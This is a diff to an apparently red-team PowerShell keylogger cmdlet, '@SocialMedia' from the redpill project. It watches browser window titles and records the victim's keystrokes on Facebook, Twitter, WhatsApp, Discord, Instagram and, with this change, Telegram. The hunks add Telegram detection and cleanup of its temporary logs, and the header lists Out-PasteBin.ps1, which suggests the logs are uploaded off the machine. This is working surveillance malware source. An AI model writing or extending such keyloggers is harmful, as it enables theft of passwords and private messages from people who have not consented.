@@ -6,11 +6,11 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Get-Process,mscore.ps1
    Optional Dependencies: Out-PasteBin.ps1
-   PS cmdlet Dev version: v1.5.19
+   PS cmdlet Dev version: v1.5.20
    
 .DESCRIPTION
-   Record keyboard keystrokes if target has whatsapp,facebook
-   twitter,discord or instagram in the 'active browser tab'
+   Record keyboard keystrokes if target has WhatsApp,Facebook
+   Twitter,Discord,Telegram,Instagram in the 'active browser tab'
 
 .NOTES
    Browsers supported: MsEdge,Chrome,Chromium,Opera,Safari,Firefox.
@@ -124,7 +124,7 @@
 
 
 Clear-Host
-$CmdletVersion = "v1.5.19"
+$CmdletVersion = "v1.5.20"
 $IPath = (Get-Location).Path
 $CurrentTime = (Get-Date -Format 'HH:mm')
 $ErrorActionPreference = "SilentlyContinue"
@@ -142,7 +142,7 @@ $StartBanner = @"
 "@;
 
 write-host $StartBanner -ForegroundColor DarkRed
-write-host "Capture keystrokes {Facebook,Twitter,Whatsapp,Discord,Instagram}" -ForegroundColor DarkGray
+write-host "Capture keystrokes {from major social media sites}" -ForegroundColor DarkGray
 write-host "  ♟ GitHub: https://github.com/r00t-3xp10it/redpill ♟" -ForegroundColor DarkYellow
 $host.UI.RawUI.WindowTitle = "@SocialMedia $CmdletVersion {SSA@RedTeam}"
 write-host "  ╰➤ [" -ForegroundColor Green -NoNewline
@@ -269,14 +269,14 @@ function Invoke-ScheduleStart ()
       Helper - Schedule cmdlet execution! [HH:mm]
    #>
 
-   If($Schedule -match '^(\d+\d+:+\d+\d)$')
+   If($Schedule -match '^(\d\d:\d\d)$')
    {
       write-host "   ╰➤ 🕘 " -ForegroundColor Red -NoNewline
       write-host "Execution schedule to " -ForegroundColor Blue -NoNewline
       write-host "$Schedule" -NoNewline
       write-host " hours." -ForegroundColor Blue
 
-      while($true)
+      For(;;)
       {
          ## Compare $CurrentTime with $StartTime
          $CurrentTime = (Get-Date -Format 'HH:mm')
@@ -365,6 +365,7 @@ function Invoke-CheckMediaForChange ()
    If([bool](Test-Path -Path "$Env:TMP\Smeagol.log") -match '^(True)$')
    {
       If($StartKeys -match 'Discord'){$SocialSite = "Discord"}
+      If($StartKeys -match 'Telegram'){$SocialSite = "Telegram"}
       If($StartKeys -match 'WhatsApp'){$SocialSite = "Whatsapp"}
       If($StartKeys -imatch 'Facebook'){$SocialSite = "Facebook"}
       If($StartKeys -match 'Instagram'){$SocialSite = "Instagram"}
@@ -458,7 +459,7 @@ If($Mode -iMatch '^(start)$')
    $pid > "$Env:TMP\met.pid"
    
    
-   while($true)
+   For(;;)
    {
       <#
       .SYNOPSIS
@@ -475,7 +476,7 @@ If($Mode -iMatch '^(start)$')
          {
             ## Get browser Main Window Title (active tab)
             $StartKeys = (Get-Process -Name "$Item").MainWindowTitle|Where-Object{$_ -NotMatch '^(0)$'}|Where-Object{$_ -ne ''}
-            If(($StartKeys -iMatch 'Facebook') -or ($StartKeys -iMatch '/ X |Twitter.com') -or ($StartKeys -Match 'WhatsApp') -or ($StartKeys -imatch 'Instagram') -or ($StartKeys -imatch 'Discord'))
+            If(($StartKeys -iMatch 'Facebook') -or ($StartKeys -iMatch '/ X |Twitter.com') -or ($StartKeys -Match 'WhatsApp') -or ($StartKeys -imatch 'Instagram') -or ($StartKeys -imatch 'Discord') -or ($StartKeys -imatch 'Telegram'))
             {
                ## Detect social media changes
                Invoke-CheckMediaForChange
@@ -504,6 +505,11 @@ If($Mode -iMatch '^(start)$')
                If($StartKeys -imatch 'Discord')
                {
                   $SocialSite = "Discord"
+                  echo "$SocialSite" > $Env:TMP\Smeagol.log
+               }
+               If($StartKeys -imatch 'Telegram')
+               {
+                  $SocialSite = "Telegram"
                   echo "$SocialSite" > $Env:TMP\Smeagol.log
                }
 
@@ -566,6 +572,7 @@ If($Mode -iMatch '^(start)$')
                      Remove-Item -Path "$Env:TMP\Smeagol.log" -Force
                      Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Discord" -Force
                      Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Twitter" -Force
+                     Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Telegram" -Force
                      Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Facebook" -Force
                      Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Whatsapp" -Force
                      Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Instagram" -Force
@@ -624,7 +631,7 @@ If($Mode -iMatch '^(stop)$')
 
 
    write-host "`n"
-   $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'.Whatsapp' /C:'.Instagram' /C:'.Discord' /C:'AUTO_BACKUP.'
+   $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'.Whatsapp' /C:'.Instagram' /C:'.Discord' /C:'.Telegram' /C:'AUTO_BACKUP.'
    If(-not([string]::IsNullOrEmpty($GetLogNames)))
    {
       ForEach($PreventDuplicate in $GetLogNames)
@@ -643,7 +650,7 @@ If($Mode -iMatch '^(stop)$')
             $viriato = (Get-Content "$Env:TMP\${PreventDuplicate}")  
             If("$viriato" -match "$diogene")
             {
-               $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'.Whatsapp' /C:'.Instagram' /C:'.Discord'|findstr /V 'AUTO_BACKUP.'
+               $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'.Whatsapp' /C:'.Instagram' /C:'.Discord' /C:'.Telegram'|findstr /V 'AUTO_BACKUP.'
                break ## Break loop after found two duplicated files = delete AUTO_BACKUP. from [output] table
             }
          }
@@ -672,6 +679,7 @@ If($Mode -iMatch '^(stop)$')
       Remove-Item -Path "$Env:TMP\Out-Pastebin.ps1" -Force
       Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Discord" -Force
       Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Twitter" -Force
+      Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Telegram" -Force
       Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Facebook" -Force
       Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Whatsapp" -Force
       Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Instagram" -Force
